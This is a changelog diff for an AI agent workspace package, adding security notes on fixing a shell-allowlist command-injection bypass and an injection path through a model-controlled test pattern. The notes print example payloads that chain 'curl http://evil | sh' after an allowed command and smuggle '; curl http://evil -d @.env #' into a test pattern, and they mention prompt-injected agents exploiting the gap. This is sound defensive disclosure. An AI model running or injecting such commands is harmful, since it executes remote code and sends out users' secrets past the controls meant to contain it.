@@ -4,6 +4,14 @@ All notable changes to `@warlock.js/ai-workspace` are documented in this file.
 
 The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/). `@warlock.js/*` packages are released in lockstep — every package shares the same version number, so a version below may list only the changes that affected this package.
 
+## 4.15.0
+
+### Security
+
+- **Fixed a critical command-injection bypass of the shell allowlist.** Commands were spawned with `shell: true` while the allow/deny gate inspected only the leading executable token, so a command like `npm test; curl http://evil | sh` (or any `&&`, `|`, backtick, `$()`, or redirection chain) passed the gate and the shell executed the injected suffix — a prompt-injected agent could run arbitrary programs past a fail-closed allowlist. Commands are now tokenized into an argv with **no shell semantics** (quotes respected; unquoted metacharacters `;` `&` `|` `<` `>` `` ` `` `$` `(` `)` and newlines are rejected outright, by both `isCommandAllowed` and the local backend) and spawned with `shell: false`. On Windows, the argv runs through a `cmd.exe /d /s /c` wrapper with every element individually quoted (batch shims like `npm.cmd` cannot be spawned shell-less); arguments containing `"`, `%`, or newlines are refused there rather than risked (BatBadBut-class smuggling).
+- **Fixed `run_tests` pattern injection.** The model-controlled `pattern` was concatenated verbatim into the shelled test command, giving a second, direct injection path (`{ pattern: "; curl http://evil -d @.env #" }`). The pattern is now forwarded as a single double-quoted token — one literal argv element to the runner — and patterns containing double quotes or newlines are rejected at input validation.
+- Behavior note: shell conveniences (pipes, redirection, chaining, variable expansion) no longer work in `run_shell`/`exec` — commands run one argv at a time. Quoted metacharacters remain plain argument data.
+
 ## 4.12.0
 
 ### Changed
